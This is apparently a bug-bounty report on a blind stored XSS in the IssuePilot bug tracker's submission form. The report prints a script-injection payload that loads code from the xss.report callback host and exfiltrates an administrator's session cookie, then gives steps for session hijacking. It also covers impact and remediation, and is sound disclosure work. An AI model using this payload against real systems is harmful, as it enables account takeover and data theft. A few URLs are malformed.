## Title
Blind XSS - IssuePilot Bug Tracker
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://issuepilot.pwnedbox.site/

<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
**Affected Parameters / Fields:** `Description`, `Steps to reproduce`, `Expected behavior`, and `Actual behavior`  

**Vulnerability Type:** Blind Cross-Site Scripting (Blind XSS) -> Admin Account Takeover

A **Blind Cross-Site Scripting (XSS)** vulnerability exists across four input fields (**Description**, **Steps to reproduce**, **Expected behavior**, and **Actual behavior**) of the public bug submission form (`https://issuepilot.pwnedbox.site`) on IssuePilot. User-supplied input submitted when reporting a bug is stored in the backend database and rendered unescaped inside the administrative report triage page (`/admin/view.php?id=<ID>`).

Because the `PHPSESSID` session cookie lacks the `HttpOnly` flag and the application fails to sanitize HTML tags or enforce a Content Security Policy, an unauthenticated attacker can inject an external script payload (`<ScRiPt src=...>`) that executes automatically when an administrator reviews the bug report—exfiltrating the administrator's session cookie and enabling **full administrative account takeover**.

## Steps to Reproduce
1. Navigate to `https://issuepilot.pwnedbox.site`, enter a **Bug title**, and insert `'"><ScRiPt src=https://xss.report/c/tou></ScRiPt>` into **Description**, **Steps to reproduce**, **Expected behavior**, and **Actual behavior**, then submit the form.
2. Log in to the administrative portal and open the submitted bug report .
3. Observe on `xss.report` that four Blind XSS callbacks fire immediately—capturing the admin URL (`https://pwnedbox.site`), DOM screenshot, and non-`HttpOnly` `PHPSESSID` cookie (`852e048850369b25988fddc4618e4e28`).
4. In an unauthenticated browser session on `https://issuepilot.pwnedbox.site`, replace the `PHPSESSID` cookie value via DevTools (`Application -> Cookies`) with the captured admin `PHPSESSID` and navigate to `https://pwnedbox.siteadmin/dashboard.php` to confirm full administrative workspace access.


## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
**1. Submit form with payload in `Description`, `Steps to reproduce`, `Expected behavior`, and `Actual behavior` fields**

<img width="1600" height="819" alt="image" src="https://github.com/user-attachments/assets/4bd5fc43-e239-40b3-ac38-7c1f88813ccf" />

**2. Ticket is opened in an admin's account**

<img width="1600" height="802" alt="image" src="https://github.com/user-attachments/assets/8c616bcd-9f87-433c-aced-12cb95aec853" />

**3. It can be seen that 4 field's outputs are visible in xss.report**

<img width="1600" height="821" alt="image" src="https://github.com/user-attachments/assets/c89b3af8-af79-4eff-b239-5397c79d33b7" />

**4. On opening any one's output, admin's cookie can be seen**

<img width="1600" height="813" alt="image" src="https://github.com/user-attachments/assets/91ba80b9-b25f-4abc-8265-b9801f2c4252" />

**5. In an normal user's browser session, change the cookie to that of the admin's**

<img width="1600" height="767" alt="image" src="https://github.com/user-attachments/assets/cb40175e-703f-4e24-9270-b611f12e4907" />

**6. Observe admin account takeover**

<img width="1600" height="754" alt="image" src="https://github.com/user-attachments/assets/8be595c5-e2bb-42c2-bf15-b05989d4d39c" />

## Impact
An unauthenticated external attacker can achieve **full administrative account takeover** simply by submitting a public bug report and waiting for an administrator or triager to view it. Successful exploitation allows an attacker to:
* Steal active administrator session cookies (`PHPSESSID`) and hijack privileged admin workspace sessions.
* Read, modify, triage, or delete all submitted bug reports and confidential user submissions.
* Deface the platform or pivot to further server-side attacks from the authenticated admin panel.

## Remediation
* **Context-Aware Output Encoding:** Encode all user-supplied bug submission fields (`Bug title`, `Description`, `Steps to reproduce`, `Expected behavior`, `Actual behavior`, etc.) using HTML entity encoding (`<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, `'` to `&#x27;`) before rendering them inside `/admin/view.php` and `/admin/dashboard.php`.
* **Set `HttpOnly` and `Secure` Cookie Flags:** Configure the `PHPSESSID` session cookie with `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) attributes so sensitive session tokens cannot be accessed via JavaScript (`document.cookie`).
* **Implement Content Security Policy (CSP):** Configure a strict `Content-Security-Policy` HTTP response header (e.g., `default-src 'self'; script-src 'self'`) to block unauthorized external script domains (`xss.report`) and inline JavaScript execution.
